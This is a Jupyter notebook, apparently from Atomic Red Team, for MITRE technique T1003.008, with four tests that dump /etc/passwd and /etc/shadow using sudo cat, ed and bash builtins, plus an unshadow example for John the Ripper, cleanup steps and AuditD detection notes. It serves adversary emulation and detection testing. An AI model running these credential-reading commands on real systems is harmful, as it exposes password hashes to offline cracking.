{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d129f0ab",
   "metadata": {},
   "source": "# T1003.008 - /etc/passwd and /etc/shadow\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n"
  },
  {
   "cell_type": "markdown",
   "id": "9f9093bb",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "847f714c",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Access /etc/shadow (Local)",
    "/etc/shadow file is accessed in Linux environments\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo cat /etc/shadow > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1af5d2e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "de34f111",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f30d031",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "639df813",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Access /etc/passwd (Local)",
    "/etc/passwd file is accessed in Linux environments\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncat /etc/passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "776ffdae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "c653fab3",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15d5065b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "78ca0837",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Access /etc/{shadow,passwd} with a standard bin that's not cat",
    "Dump /etc/passwd and /etc/shadow using ed\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\necho -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a0a3c3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "1f3f0886",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32d5a0a8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eb3320c6",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Access /etc/{shadow,passwd} with shell builtins",
    "Dump /etc/passwd and /etc/shadow using bash builtins\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nfunction testcat(){ echo \"$(< $1)\"; }\ntestcat /etc/passwd > /tmp/T1003.008.txt\ntestcat /etc/shadow > /tmp/T1003.008.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e9f6d9f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5fbc8604",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -f /tmp/T1003.008.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f5a6613",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.008 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b5c194b8",
   "metadata": {},
   "source": "## Detection\nThe AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}